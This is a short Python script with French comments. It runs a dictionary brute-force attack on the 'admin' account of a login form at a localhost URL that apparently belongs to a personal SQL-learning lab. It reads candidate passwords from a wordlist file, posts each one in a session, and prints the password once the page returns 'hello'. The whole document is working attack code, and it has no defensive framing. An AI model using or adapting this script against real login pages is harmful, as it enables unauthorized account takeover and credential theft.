# Import request for Post Request
import requests
import urllib
import re

# déclaration de variable

numberOfLine = 0
# Read Line

f = open("mypasswordList.txt", "r")


# Setup Link Post request

url = "http://localhost/SQLlearning/MiniChat/minichat.php"
headers = {'User-Agent': 'Mozilla/5.0'}
userPass = {'Username': 'admin', 'Password': " "}
session = requests.Session()

# Bruteforce password one by one
for password in f:
    for word in password.split():
        numberOfLine += 1
        userPass["Password"] = word
        result = session.post(url, headers=headers, data=userPass)
        site = urllib.request.urlopen(result.url).read().decode()
        myvar = site.find("hello")
        if(myvar != -1):
            print("Mot de passe trouvé via le dictionnaire à la position",numberOfLine)
            print("Le mot de passe est :" , word)
            exit()
